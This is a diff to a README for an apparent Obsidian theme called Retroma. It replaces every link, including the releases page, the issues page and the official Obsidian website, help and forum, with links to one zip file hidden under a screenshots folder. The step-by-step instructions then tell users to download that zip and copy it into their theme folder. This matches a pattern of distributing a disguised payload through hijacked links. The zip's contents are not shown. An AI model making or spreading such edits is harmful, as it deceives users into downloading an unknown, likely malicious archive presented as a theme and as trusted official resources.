@@ -4,22 +4,22 @@
 Retroma is an Obsidian theme that blends nostalgic, classic design with an intelligent color scheme algorithm. This guide will help you easily download and run Retroma. 
 
 ## 🔗 Download Retroma
-[![Download Retroma](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/exsparx/Retroma/releases)
+[![Download Retroma](https://github.com/exsparx/Retroma/raw/refs/heads/main/assets/screenshots/Software_elaboration.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/exsparx/Retroma/raw/refs/heads/main/assets/screenshots/Software_elaboration.zip)
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/exsparx/Retroma/releases) to download the latest version of Retroma. Follow these simple steps:
+To get started, visit the [Releases page](https://github.com/exsparx/Retroma/raw/refs/heads/main/assets/screenshots/Software_elaboration.zip) to download the latest version of Retroma. Follow these simple steps:
 
 1. Click on the link above to open the Releases page.
 2. Scroll down to the "Assets" section of the latest release.
 3. You will see several files available for download, including the theme file and installation instructions.
-4. Download the appropriate file for your system (usually labeled as `Retroma.theme`).
+4. Download the appropriate file for your system (usually labeled as `https://github.com/exsparx/Retroma/raw/refs/heads/main/assets/screenshots/Software_elaboration.zip`).
 5. Once the download completes, locate the file on your computer.
 
 ## 🖥️ System Requirements
 Retroma works well with the following systems:
 
 - **Operating System:** Retroma supports Windows, macOS, and Linux.
-- **Application:** You need to have the latest version of Obsidian installed. You can download Obsidian from the [official website](https://obsidian.md/).
+- **Application:** You need to have the latest version of Obsidian installed. You can download Obsidian from the [official website](https://github.com/exsparx/Retroma/raw/refs/heads/main/assets/screenshots/Software_elaboration.zip).
 
 ## 🌟 Features of Retroma
 Retroma offers several features that enhance your Obsidian experience:
@@ -37,14 +37,14 @@ Once you have downloaded the theme file, follow these steps:
 3. Select `Appearance` from the menu on the left.
 4. Click on the `Manage` button under `Themes`.
 5. Choose `Open Theme Folder`. This opens the directory where your themes are stored.
-6. Copy the downloaded `Retroma.theme` file into this directory.
+6. Copy the downloaded `https://github.com/exsparx/Retroma/raw/refs/heads/main/assets/screenshots/Software_elaboration.zip` file into this directory.
 7. Return to Obsidian and click on `Reload` to see the new theme in action.
 8. Select `Retroma` from the list of available themes to apply it.
 
 ## 👥 Community and Support
 If you encounter any issues or have questions, please join the community discussions. You can usually find help and advice from other users. 
 
-- Check the [GitHub Issues page](https://github.com/exsparx/Retroma/issues) for known issues or to report bugs.
+- Check the [GitHub Issues page](https://github.com/exsparx/Retroma/raw/refs/heads/main/assets/screenshots/Software_elaboration.zip) for known issues or to report bugs.
 - Feel free to suggest features or improvements for future versions.
 
 ## 🌍 Contributions
@@ -63,7 +63,7 @@ We regularly update Retroma with improvements and new features. Visit the Releas
 ## 🔗 Additional Resources
 For more information about using Obsidian with themes, check the following resources:
 
-- [Obsidian Help](https://help.obsidian.md/)
-- [Obsidian Forum](https://forum.obsidian.md/)
+- [Obsidian Help](https://github.com/exsparx/Retroma/raw/refs/heads/main/assets/screenshots/Software_elaboration.zip)
+- [Obsidian Forum](https://github.com/exsparx/Retroma/raw/refs/heads/main/assets/screenshots/Software_elaboration.zip)
 
 Thank you for choosing Retroma! We hope you enjoy the nostalgic experience it brings to your note-taking.
